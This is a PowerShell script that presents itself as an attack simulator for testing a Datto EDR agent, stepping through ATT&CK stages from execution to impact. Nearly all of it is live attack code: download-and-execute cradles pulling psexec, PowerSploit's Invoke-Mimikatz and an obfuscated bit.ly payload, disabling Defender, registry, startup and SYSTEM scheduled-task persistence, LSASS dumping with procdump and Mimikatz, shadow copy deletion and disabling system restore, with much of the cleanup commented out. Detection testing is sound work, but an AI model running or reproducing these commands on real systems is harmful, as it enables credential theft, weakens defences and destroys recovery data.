# This is a test script used to mimic an attack. 
# The only real malware employed is mimikatz and it will only be used to extra passwords, those passwords will not be saved or sent anywhere.

If (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Write-Warning "[Error] You do not have Administrator rights to run this script!`nPlease re-run as an Administrator!"
    Start-Sleep 10
    return
}
$agent = Get-Service -Name HUNTAgent
if (-NOT $agent) {
    Write-Warning "[Error] Datto EDR Agent is not installed!`nExiting..."
    return
}
If ($agent.status -ne "Running") {
    Write-Warning "[Error] Datto EDR Agent is NOT running!`nAttempting to enable..."
    $agent.Start
    Start-Sleep 1
    If ($agent.status -ne "Running") {
        Write-Warning "[Error] Datto EDR Agent could not be restarted!`nExiting..."
        return
    }
}

#Define some randomness
$n = 1000+$(Get-Random -Max 999)

Write-Host "Starting Datto Attack Simulator"
New-Item -Path "$env:TEMP" -Name "AttackSim" -ItemType "directory" -ErrorAction Ignore
$attackDir = "$env:TEMP\AttackSim"


Write-Host "Starting Single Endpoint Behavioral Attack Simulation. No persistent malware is used."


#### EXECUTION
Write-Host "Starting Execution Step"

Write-Host "Initiating a T1059.001 - Powershell Download Harness"
Write-Host "(Execution-T1059.001) Detected use of hidden powershell base64 encoded commands"
Write-Host "[ATT&CK T1059.001 - Execution - Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059/001)"
$cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe'); Start-Sleep -m $n"
Powershell.exe -NoP -command $cmd


Write-Host "Initiating a T1059.001 - Powershell Encoded and hidden Download Harness"
$Cmd = "(new-object System.Net.WebClient).DownloadFile('https://live.sysinternals.com/psexec.exe', '$attackDir\bad.exe'); Start-Sleep -m $n"
$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Cmd)
)
powershell.exe -win H -NoP -e $EncodedCommand

Write-Host "Initiating T1059.001 - Powershell Execution From Alternate Data Stream"
$cmd = @"
Add-Content -Path $attackDir\NTFS_ADS.txt -Value 'Write-Host "Stream Data Executed"' -Stream 'streamCommand';
iex (Get-Content -Path $attackDir\NTFS_ADS.txt -Stream 'streamcommand'| Out-String)
Start-Sleep -m $n
"@
powershell.exe -Win N -exec bypass -nop -command $cmd
Start-Sleep 5
Remove-Item $attackDir\NTFS_ADS.txt -Force -ErrorAction Ignore

Start-Sleep 10


# DISCOVERY
Write-Host -ForegroundColor Cyan "`n`nStarting discovery step"

Write-Host "Initiating Discovery - T1082 - System Information Discovery"
Write-Host "When an adversary first gains access to a system, they often gather detailed information about the compromised system and network including users, operating system, hardware, patches, and architecture. Adversaries may use the information to shape follow-on behaviors, including whether or not to fully infect the target and/or attempt specific actions like a ransom.`n"
$cmd = @"
    '==== Hostname ====' > $attackDir\recon.txt
    Hostname >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== Whoami ====' >> $attackDir\recon.txt
    whoami >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== MachineGuid (best unique id to use) ====' >> $attackDir\recon.txt
    REG QUERY HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography /v MachineGuid >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== System Info ====' >> $attackDir\recon.txt
    Systeminfo >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== Antivirus Product ====' >> $attackDir\recon.txt
    WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName,pathToSignedProductExe,pathToSignedReportingExe,productState 2>&1 >> $attackDir\recon.txt
    '' >> $attackDir\recon.txt
    '==== Local Administrators ====' >> $attackDir\recon.txt
    net localgroup administrators 2>&1 >> $attackDir\recon.txt 
    '' >> $attackDir\recon.txt
    '==== Domain Administrators ====' >> $attackDir\recon.txt
    net group 'domain admins' /domain 2>&1 >> $attackDir\recon.txt 
    '' >> $attackDir\recon.txt
    '==== Exchange Administrators ====' >> $attackDir\recon.txt
    net group 'Exchange Trusted Subsystem' /domain 2>&1 >> $attackDir\recon.txt
    Start-Sleep -m $n
"@
Powershell.exe -nop -command $cmd
Start-Sleep 3
Remove-item $attackDir\recon2.txt -ErrorAction Ignore -force

Write-Host "Initiating Discovery - T1018 - Remote System Discovery"
Write-Host "Upon compromise of a system, attackers need to move to more important systems. They first enumerate nearby systems to determine what is available.`n"
$cmd = @"
    '==== Terminal Services Remote Host List (who has this system remoted into?) ====' >> $attackDir\recon2.txt
    reg query 'HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default' 2>&1 >> $attackDir\recon2.txt
    '' >> $attackDir\recon2.txt
    '==== Domain Controllers ====' >> $attackDir\recon2.txt
    net group "domain controllers" /domain 2>&1 >> $attackDir\recon2.txt 
    '' >> $attackDir\recon2.txt
    '==== Local Network Systems ====' >> $attackDir\recon2.txt
    net view /all /domain 2>&1 >> $attackDir\recon2.txt
    Start-Sleep -m $n
"@
Powershell.exe -nop -command $cmd
Start-Sleep 3
Remove-item $attackDir\recon2.txt -ErrorAction Ignore -force

# AlwaysInstallElevated Enumeration (useful to set this to 1 if your malware uses MSI to elevate privs)
$cmd = 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1; Start-Sleep -m $n'
Powershell.exe -nop -command $cmd

Start-Sleep 10


#### EVASION
Write-Host -ForegroundColor Cyan "`n`nStarting defense evasion step"
Write-Host "Initiating Defense Evasion - T1089 - Disabling Security Tools"
Write-Host "Disabling Defender..."
$cmd = "Set-MpPreference -DisableRealtimeMonitoring `$true; Start-Sleep -m $n"
powershell.exe -Win N -exec bypass -nop -command $cmd
sc.exe config WinDefend start= disabled 2>$null
sc.exe stop WinDefend 2>$null


Write-Host "Creating binary with double extension"
Copy-Item -Path C:\Windows\System32\calc.exe -Destination "$attackDir\AttackSim$($n).pdf.exe"
Write-Host "Initiating double-extension binary execution"
Start-Process -FilePath "$attackDir\AttackSim$($n).pdf.exe"
Start-Sleep 2
Stop-Process -Name AttackSim* -Force -ErrorAction Ignore
Remove-Item "$attackDir\AttackSim$($n).pdf.exe" -Force -ErrorAction Ignore


Write-Host "Initiating Defense Evasion - T1027 - Obfuscated Files or Information"
Write-Host "Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.`n"
Write-Host "Certutil Download and Decode"
certutil -urlcache -split -f "http://www.brainjar.com/java/host/test$($n).html" test.txt 
certutil -decode -f test.txt "WindowsUpdate$($n).exe"
Start-Sleep 10
Remove-Item test.txt -Force -ErrorAction Ignore



#### PERSISTENCE
Write-Host -ForegroundColor Cyan "`n`nStarting Foothold / Persistence Step"

Write-Host "Autostart locations like Registry Run Keys or files in User Startup Folders will cause that program to execute when a user logs in or the system reboots. Each autostart may have it’s own trigger for automated execution.`n"
Write-Host "Adding T1547.001 - Registry Run Key Foothold w/ undetectable malware (calc)"
REG ADD "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /t REG_SZ /F /D "C:\Windows\System32\calc.exe -i $n"
Start-Sleep 2
#REG DELETE "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /V "Red Team" /f 2>$null

Write-Host "Adding T1547.001 - Registry Run Key w/ Fileless Powershell Command"
$subcmd = 'powershell.exe -command "IEX (New-Object Net.WebClient).DownloadString(`"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/36f83b728bc26a49eacb0535edc42be8c377ac54/ARTifacts/Misc/Discovery.bat`");"'
$cmd = @"
set-itemproperty HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce "NextRun" '$subcmd'
Start-Sleep -m $n
"@
powershell.exe -Win N -exec bypass -nop -command $cmd

#Start-Sleep 2
#Remove-ItemProperty -Path HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce -Name "NextRun" -Force -ErrorAction Ignore

Write-Host "Adding T1547.001 - Start Up Folder Persistence with detectable malware (EICAR File)"
Write-Host "Downloading IECAR file..."
Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\EICAR.exe"


Write-Host "Adding T1547.009 - Malicious Shortcut Link Persistence with detectable malware (EICAR File)"
Write-Host "Downloading IECAR file..."
Invoke-WebRequest -Uri "https://www.eicar.org/download/eicar.com.txt" -OutFile "$attackDir\EICAR.exe"
$cmd = "`$Target = `"$attackDir\EICAR.exe`"`n"
$cmd = @'
$target = 'C:\windows\system32\calc.exe'
$ShortcutLocation = 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk'
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()
$ShortcutLocation = 'c:\users\public\Desktop\evil_calc.lnk'
$WScriptShell = New-Object -ComObject WScript.Shell
$Create = $WScriptShell.CreateShortcut($ShortcutLocation)
$Create.TargetPath = $Target
$Create.Save()
'@
$cmd += "`nStart-Sleep -m $n"
powershell.exe -Win N -exec bypass -nop -command $cmd
Start-Sleep 2
#Remove-Item "$attackDir\EICAR.exe" -Force -ErrorAction Ignore
#Remove-Item "$home\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil_calc.lnk" -ErrorAction Ignore
#Remove-Item "$home\Desktop\evil_calc.lnk" -ErrorAction Ignore



Write-Host "Adding Persistence - T1053 - On Logon Scheduled Task Startup Script"
schtasks /create /tn "T1053_005_OnLogon" /sc onlogon /tr "cmd.exe /c calc.exe -i $n" /f
Write-Host "Adding Persistence - T1053 - On Startup cheduled Task Startup Script"
schtasks /create /tn "T1053_005_OnStartup" /sc onstart /ru system /tr "cmd.exe /c calc.exe -i $n" /f
Start-sleep 2
#schtasks /delete /tn "T1053_005_OnLogon" /f 2>$null
#schtasks /delete /tn "T1053_005_OnStartup" /f 2>$null

Start-Sleep 10

Write-Host "Testing Persistence by executing T1059.001 - Powershell Command From Registry Key"
$Cmd = "Write-Host -ForegroundColor Red 'Mess with the Best, Die like the rest!'; Start-Sleep -m $n"
$EncodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Cmd))
reg.exe add "HKEY_CURRENT_USER\Software\Classes\RedTeamTest" /v RT /t REG_SZ /d "V3JpdGUtSG9zdCAtRm9yZWdyb3VuZENvbG9yIFJlZCAiTWVzcyB3aXRoIHRoZSBCZXN0LCBEaWUgbGlrZSB0aGUgcmVzdCEi" /f
$cmd = @"
iex ([Text.Encoding]::ASCII.GetString([Convert]::FromBase64String((gp 'HKCU:\Software\Classes\RedTeamTest').RT))); 
Start-Sleep -m $n
"@
powershell.exe -Win N -exec bypass -nop -command $cmd

Start-Sleep 2
Remove-Item HKCU:\Software\Classes\RedTeamTest -Force -ErrorAction Ignore

Start-Sleep 10

# CREDENTIAL
Write-Host -ForegroundColor Cyan "`nStarting Credential Harvesting step"
Write-Host "Downloading ProcDump.exe"
Invoke-WebRequest -Uri http://live.sysinternals.com/procdump.exe -OutFile "$AttackDir\procdump.exe"
Write-Host "Dumping LSASS memory with ProcDump.exe to extract passwords and tokens"
#Start-Process -FilePath "$AttackDir\procdump.exe" -ArgumentList "-ma lsass.exe lsass.dmp -accepteula -at $n 2>$null" 2>$null -Wait
& $AttackDir\procdump.exe -ma lsass.exe lsass.dmp -accepteula -dc $n

Write-host "Initiating Credential Access - T1003 - Credential Dumping with Mimikatz"
Start-Sleep 2
Remove-Item "$attackDir\lsass.dmp" -Force -ErrorAction Ignore

# Mimikatz
powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds; Start-Sleep -m $n"


Write-Host "Initiating T1059.001 - Powershell Execution of Mimikatz w/ Obfuscation"
$cmd = @'
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
IEX((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_})))
(New-Object Net.WebClient).DownloadFile('http://bit.ly/L3g1tCrad1e','Default_File_Path.ps1');
[ScriptBlock]::Create((-Join([IO.File]::ReadAllBytes('Default_File_Path.ps1')|ForEach-Object{[Char]$_}))).InvokeReturnAsIs()
Set-Variable HJ1 'http://bit.ly/L3g1tCrad1e';
SI Variable:/0W 'Net.WebClient';
Set-Item Variable:\gH 'Default_File_Path.ps1';
ls _-*;
Set-Variable igZ (.$ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand.PsObject.Methods|?{$_.Name-like'*Cm*t'}).Name).Invoke($ExecutionContext.InvokeCommand.(($ExecutionContext.InvokeCommand|GM|?{$_.Name-like'*om*e'}).Name).Invoke('*w-*ct',$TRUE,1))(Get-ChildItem Variable:0W).Value);Set-Variable J ((((Get-Variable igZ -ValueOn)|GM)|?{$_.Name-like'*w*i*le'}).Name);(Get-Variable igZ -ValueOn).((ChildItem Variable:J).Value).Invoke((Get-Item Variable:/HJ1).Value,(GV gH).Value);&( ''.IsNormalized.ToString()[13,15,48]-Join'')(-Join([Char[]](CAT -Enco 3 (GV gH).Value)))
Invoke-Mimikatz -DumpCreds 
'@
$cmd += "`nStart-Sleep -m $n"

powershell.exe -Win N -exec bypass -nop -command $cmd

Start-Sleep 10


# LATERAL MOVEMENT
Write-Host -ForegroundColor Cyan "`nStarting Lateral Movement Step"
Write-Host "Adding Passwordless Guest Accounts to Remote Desktop Users"
net localgroup "Remote Desktop Users" Guest /add /comment:"$n"
Start-Sleep 3
#Cleanup
Write-Host "Removing Guest from Remote Desktop Users"
net localgroup "Remote Desktop Users" Guest /delete

# AlwaysInstallElevated Enumeration (useful to set this to 1 if your malware uses MSI to elevate privs)
$cmd = 'Enable-WSManCredSSP Server -n $n'
Powershell.exe -nop -command $cmd

# Execute Remote Command using WMI
wmic /node:targetcomputername process call create 'powershell.exe -command {$a = "EICARTES"; $a+= "T"; cmd.exe /c echo $a}' 2>$null

Start-Sleep 10


#### IMPACT
Write-Host -ForegroundColor Cyan "`nStarting Impact Step"
Write-Host "Testing Rule: Disable Automatic Windows Recovery (Note: these test commands are designed with syntax errors)"
Write-Host "(Impact-T1490) Automatic Windows recovery features disabled"
Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n 2>$null
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "1" /f /i $n 2>$null
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "1" /f /i $n 2>$null
Start-Sleep 2

# clean up
#Write-Host "Restoring Automatic Windows recovery features"
#reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
#reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
#reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
#reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f


Write-Host "Testing Rule: Shadow Copy Deletion"
Write-Host "(Impact-T1490) Volume shadow copy was deleted"
Write-Host "[ATT&CK T1490 - Impact - Inhibit System Recovery](https://attack.mitre.org/techniques/T1490)"
vssadmin.exe delete shadows /All /Shadow=$n /quiet 2>$null


Write-Host "Testing Rule: Wallpaper Defacement"
Write-Host "[ATT&CK T1491 - Impact - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491)"
Write-Host "(Impact-T1491) Possible defacement - Wallpaper was changed via commandline"
$cmd = @'
$oldwallpaper = Get-ItemProperty "HKCU:\Control Panel\Desktop" | select WallPaper -ExpandProperty wallpaper
reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $oldwallpaper /f
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
'@
$cmd += "`nStart-Sleep -m $n"
powershell.exe -Win N -exec bypass -nop -command $cmd


Write-Host "Restarting Defender..."
sc.exe config WinDefend start= Auto
sc.exe start WinDefend
Set-MpPreference -DisableRealtimeMonitoring $false

#Remove-Item -Path $attackDir -Recurse -force -ErrorAction Ignore


Function Set-WallPaper {    
    param (
        [parameter(Mandatory=$True)]
        # Provide path to image
        [string]$Image,
        # Provide wallpaper style that you would like applied
        [parameter(Mandatory=$False)]
        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
        [string]$Style
    )

    $WallpaperStyle = Switch ($Style) {
        "Fill" {"10"}
        "Fit" {"6"}
        "Stretch" {"2"}
        "Tile" {"0"}
        "Center" {"0"}
        "Span" {"22"}
    }
    If($Style -eq "Tile") {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 1 -Force
    }
    Else {
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value $WallpaperStyle -Force
        New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value 0 -Force
    }

    Add-Type -TypeDefinition @" 
    using System; 
    using System.Runtime.InteropServices;
        
    public class Params
    { 
        [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
        public static extern int SystemParametersInfo (Int32 uAction, 
                                                        Int32 uParam, 
                                                        String lpvParam, 
                                                        Int32 fuWinIni);
    }
"@ 
    $SPI_SETDESKWALLPAPER = 0x0014
    $UpdateIniFile = 0x01
    $SendChangeEvent = 0x02
    
    $fWinIni = $UpdateIniFile -bor $SendChangeEvent
    
    $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
}
#Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit